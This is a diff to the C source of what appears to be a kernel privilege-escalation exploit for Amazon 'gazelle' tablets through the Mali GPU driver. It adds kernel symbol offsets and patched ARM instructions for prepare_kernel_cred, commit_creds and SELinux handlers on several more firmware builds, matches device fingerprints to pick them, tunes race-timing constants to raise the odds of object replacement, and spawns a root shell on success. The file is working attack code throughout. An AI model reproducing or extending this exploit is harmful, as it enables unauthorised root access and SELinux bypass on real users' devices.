@@ -40,24 +40,24 @@
 
 #define PFN_DOWN(x)	((x) >> PAGE_SHIFT)
 
-#define UNMAP_CPU 1 //1 A53 core, 4 A73 core
+#define UNMAP_CPU 1 					//1=A53 core, 4=A73 core
 
-#define UPDATE_CPU 0 //0 A53 core, 3 A73 core
+#define UPDATE_CPU 0 					//0=A53 core, 3=A73 core
 
-#define WAIT_CPU 2  //2
+#define WAIT_CPU 2  					//2
 
 #define NB_PREEMPT_THREAD 32
 
-#define NR_WATCHES  100 //100-5000+  increases window size
-#define NR_EPFDS 500 //500 increases window size
+#define NR_WATCHES  100 				//100-5000+  increases window size
+#define NR_EPFDS 500 					//500 increases window size
 
 #define TEST_ENT 3
 
 #define NSEC_PER_SEC 1000000000UL
 
-#define DEFAULT_WAIT 150
+#define DEFAULT_WAIT 125
 
-#define CORRUPTED_VA_SIZE 500 //500  increases success rate of object replacement
+#define CORRUPTED_VA_SIZE 500 				//500  increases success rate of object replacement
 
 #define CORRUPTED_COMMIT_SIZE 10
 
@@ -67,7 +67,7 @@
 #define PREPARE_KERNEL_CRED_7299_3052 0xA4A88		//proxy for init_cred		
 #define COMMIT_CREDS_7299_3052 0xA4600
 #define ADD_PREPARE_KERNEL_CRED_7299_3052 0x912a2108	//add x8, x8, #0xA88
-#define ADD_COMMIT_7299_3052 0x91180108		//add x8, x8, #0x600
+#define ADD_COMMIT_7299_3052 0x91180108			//add x8, x8, #0x600
 
 // PS7607/3166
 #define AVC_DENY_7607_3166 0x465558			
@@ -75,7 +75,7 @@
 #define PREPARE_KERNEL_CRED_7607_3166 0xA4E5C		
 #define COMMIT_CREDS_7607_3166 0xA49D4
 #define ADD_PREPARE_KERNEL_CRED_7607_3166 0x91397108	//add x8, x8, #0xE5C			
-#define ADD_COMMIT_7607_3166 0x91275108		//add x8, x8, #0x9D4
+#define ADD_COMMIT_7607_3166 0x91275108			//add x8, x8, #0x9D4
 
 // PS7613/3675
 #define AVC_DENY_7613_3675 0x465558			
@@ -83,7 +83,7 @@
 #define PREPARE_KERNEL_CRED_7613_3675 0xA4E5C		
 #define COMMIT_CREDS_7613_3675 0xA49D4
 #define ADD_PREPARE_KERNEL_CRED_7613_3675 0x91397108	//add x8, x8, #0xE5C			
-#define ADD_COMMIT_7613_3675 0x91275108		//add x8, x8, #0x9D4
+#define ADD_COMMIT_7613_3675 0x91275108			//add x8, x8, #0x9D4
 
 // PS7613/3686											
 #define AVC_DENY_7613_3686 0x465558			
@@ -91,7 +91,7 @@
 #define PREPARE_KERNEL_CRED_7613_3686 0xA4E5C		
 #define COMMIT_CREDS_7613_3686 0xA49D4
 #define ADD_PREPARE_KERNEL_CRED_7613_3686 0x91397108	//add x8, x8, #0xE5C			
-#define ADD_COMMIT_7613_3686 0x91275108		//add x8, x8, #0x9D4
+#define ADD_COMMIT_7613_3686 0x91275108			//add x8, x8, #0x9D4
 
 // PS7613/3688											
 #define AVC_DENY_7613_3688 0x465558			
@@ -99,7 +99,7 @@
 #define PREPARE_KERNEL_CRED_7613_3688 0xA4E5C		
 #define COMMIT_CREDS_7613_3688 0xA49D4
 #define ADD_PREPARE_KERNEL_CRED_7613_3688 0x91397108	//add x8, x8, #0xE5C			
-#define ADD_COMMIT_7613_3688 0x91275108		//add x8, x8, #0x9D4
+#define ADD_COMMIT_7613_3688 0x91275108			//add x8, x8, #0x9D4
 
 // PS7613/3701											
 #define AVC_DENY_7613_3701 0x465558	 		
@@ -107,7 +107,7 @@
 #define PREPARE_KERNEL_CRED_7613_3701 0xA4E5C		
 #define COMMIT_CREDS_7613_3701 0xA49D4
 #define ADD_PREPARE_KERNEL_CRED_7613_3701 0x91397108	//add x8, x8, #0xE5C			
-#define ADD_COMMIT_7613_3701 0x91275108		//add x8, x8, #0x9D4
+#define ADD_COMMIT_7613_3701 0x91275108			//add x8, x8, #0x9D4
 
 // PS7646/3550
 #define AVC_DENY_7646_3550 0x464B14             
@@ -115,7 +115,39 @@
 #define PREPARE_KERNEL_CRED_7646_3550 0xA5024        
 #define COMMIT_CREDS_7646_3550 0xA4B9C
 #define ADD_PREPARE_KERNEL_CRED_7646_3550 0x91009108	//add x8, x8, #0x024            
-#define ADD_COMMIT_7646_3550 0x912e7108		//add x8, x8, #0xb9c
+#define ADD_COMMIT_7646_3550 0x912e7108			//add x8, x8, #0xb9c
+
+// PS7646/3562
+#define AVC_DENY_7646_3562 0x464B14             
+#define SEL_READ_HANDLE_UNKNOWN_7646_3562 0x473DE8
+#define PREPARE_KERNEL_CRED_7646_3562 0xA5024        
+#define COMMIT_CREDS_7646_3562 0xA4B9C
+#define ADD_PREPARE_KERNEL_CRED_7646_3562 0x91009108	//add x8, x8, #0x024            
+#define ADD_COMMIT_7646_3562 0x912e7108			//add x8, x8, #0xb9c
+
+// PS7646/3565
+#define AVC_DENY_7646_3565 0x464B14             
+#define SEL_READ_HANDLE_UNKNOWN_7646_3565 0x473DE8
+#define PREPARE_KERNEL_CRED_7646_3565 0xA5024        
+#define COMMIT_CREDS_7646_3565 0xA4B9C
+#define ADD_PREPARE_KERNEL_CRED_7646_3565 0x91009108	//add x8, x8, #0x024            
+#define ADD_COMMIT_7646_3565 0x912e7108			//add x8, x8, #0xb9c
+
+// PS7652/3556
+#define AVC_DENY_7652_3556 0x464B14             
+#define SEL_READ_HANDLE_UNKNOWN_7652_3556 0x473DE8
+#define PREPARE_KERNEL_CRED_7652_3556 0xA5024        
+#define COMMIT_CREDS_7652_3556 0xA4B9C
+#define ADD_PREPARE_KERNEL_CRED_7652_3556 0x91009108	//add x8, x8, #0x024            
+#define ADD_COMMIT_7652_3556 0x912e7108			//add x8, x8, #0xb9c
+
+// PS7652/3564
+#define AVC_DENY_7652_3564 0x464B14             
+#define SEL_READ_HANDLE_UNKNOWN_7652_3564 0x473DE8
+#define PREPARE_KERNEL_CRED_7652_3564 0xA5024        
+#define COMMIT_CREDS_7652_3564 0xA4B9C
+#define ADD_PREPARE_KERNEL_CRED_7652_3564 0x91009108	//add x8, x8, #0x024            
+#define ADD_COMMIT_7652_3564 0x912e7108			//add x8, x8, #0xb9c
 
 static uint64_t sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7613_3701;
 
@@ -198,6 +230,34 @@ void select_offset() {
     fixup_root_shell(PREPARE_KERNEL_CRED_7646_3550, COMMIT_CREDS_7646_3550, SEL_READ_HANDLE_UNKNOWN_7646_3550, ADD_PREPARE_KERNEL_CRED_7646_3550, ADD_COMMIT_7646_3550, &(root_code[0]));
     return;
   }
+
+  if (!strcmp(fingerprint, "Amazon/gazelle/gazelle:9/PS7646.3562N/0028085971456:user/amz-p,release-keys")) {
+    avc_deny = AVC_DENY_7646_3562;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7646_3562;
+    fixup_root_shell(PREPARE_KERNEL_CRED_7646_3562, COMMIT_CREDS_7646_3562, SEL_READ_HANDLE_UNKNOWN_7646_3562, ADD_PREPARE_KERNEL_CRED_7646_3562, ADD_COMMIT_7646_3562, &(root_code[0]));
+    return;
+  }
+    
+  if (!strcmp(fingerprint, "Amazon/gazelle/gazelle:9/PS7646.3565N/0028085972224:user/amz-p,release-keys")) {
+    avc_deny = AVC_DENY_7646_3565;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7646_3565;
+    fixup_root_shell(PREPARE_KERNEL_CRED_7646_3565, COMMIT_CREDS_7646_3565, SEL_READ_HANDLE_UNKNOWN_7646_3565, ADD_PREPARE_KERNEL_CRED_7646_3565, ADD_COMMIT_7646_3565, &(root_code[0]));
+    return;
+  }
+  
+  if (!strcmp(fingerprint, "Amazon/gazelle/gazelle:9/PS7652.3556N/0028488623104:user/amz-p,release-keys")) {
+    avc_deny = AVC_DENY_7652_3556;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7652_3556;
+    fixup_root_shell(PREPARE_KERNEL_CRED_7652_3556, COMMIT_CREDS_7652_3556, SEL_READ_HANDLE_UNKNOWN_7652_3556, ADD_PREPARE_KERNEL_CRED_7652_3556, ADD_COMMIT_7652_3556, &(root_code[0]));
+    return;
+  } 
+    
+  if (!strcmp(fingerprint, "Amazon/gazelle/gazelle:9/PS7652.3564N/0028488625152:user/amz-p,release-keys")) {
+    avc_deny = AVC_DENY_7652_3564;
+    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7652_3564;
+    fixup_root_shell(PREPARE_KERNEL_CRED_7652_3564, COMMIT_CREDS_7652_3564, SEL_READ_HANDLE_UNKNOWN_7652_3564, ADD_PREPARE_KERNEL_CRED_7652_3564, ADD_COMMIT_7652_3564, &(root_code[0]));
+    return;
+  } 
 
   err(1, "unable to match build id\n");
 }
@@ -736,8 +796,9 @@ int main() {
     if (!success && need_reset_fd) {
       mali_fd2 = reset_mali2(mali_fd2);
     }
-    if (ret == 1) system("sh");
+    if (ret == 1) {
+    LOG("success after %llu\n", counter);
+    system("sh");
+    }
   }
-  LOG("success after %llu\n", counter);
 }
-
